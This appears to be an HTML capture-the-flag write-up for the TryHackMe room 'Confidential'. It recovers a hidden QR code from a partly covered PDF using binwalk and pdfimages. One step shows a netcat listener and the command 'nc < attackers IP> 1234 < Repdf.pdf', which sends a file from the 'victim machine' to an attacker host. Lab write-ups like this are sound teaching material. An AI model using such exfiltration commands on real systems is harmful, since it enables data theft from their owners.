@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <link rel="stylesheet" href="../../css/Font.css">
+        <link rel="stylesheet" href="css/code.css">
+    </head>
+    <body>
+
+        <pre>
+
+            Room name: Confidential (<a href="https://tryhackme.com/room/confidential">Link</a> )
+
+            <img src="../../public/images/Confidential/Confidential-1.png"/>
+
+            If we open that PDF, It is seen that it is partially covered and so we are nto
+            able to scan it.
+
+            lets do a binwalk on the PDF.
+
+            <img src="../../public/images/Confidential/Confidential-2.png"/>
+
+            But I think it is difficult to run binwalk and other tools we needed on the
+            THM Machine. So we can download the PDF to our machine.
+
+            To do that, We can make use of a netcat session.
+
+            <blockquote>
+                command to be executed on our machine :
+            </blockquote>
+
+            <code>
+                nc -lnvp 1234 > sus.pdf
+            </code>
+
+            <blockquote>
+                command to be executed on victim machine:
+            </blockquote>
+
+            <code>
+                nc < attackers IP> 1234 < Repdf.pdf
+            </code>
+
+            Now the nc will download the Repdf.pdf to our machine.
+
+            Now we can use a binwalk here:
+
+            <code>
+                binwalk sus.pdf
+            </code>
+
+            <img src="../../public/images/Confidential/Confidential-3.png"/>
+
+            It is messy, So we can check another tool call pdfimages
+
+            <code>
+                pdfimages -all sus.pdf ext
+            </code>
+
+            <img src="../../public/images/Confidential/Confidential-4.png"/>
+
+            Now we will get three images, Let’s Open it.
+
+            <img src="../../public/images/Confidential/Confidential-5.png"/>
+
+            <img src="../../public/images/Confidential/Confidential-6.png"/>
+
+            <img src="../../public/images/Confidential/Confidential-7.png"/>
+
+            So we got the actual QR code. So if we scan it using our mobile or using any
+            library (Like opencv), We can read the flag.
+
+
+    </body>
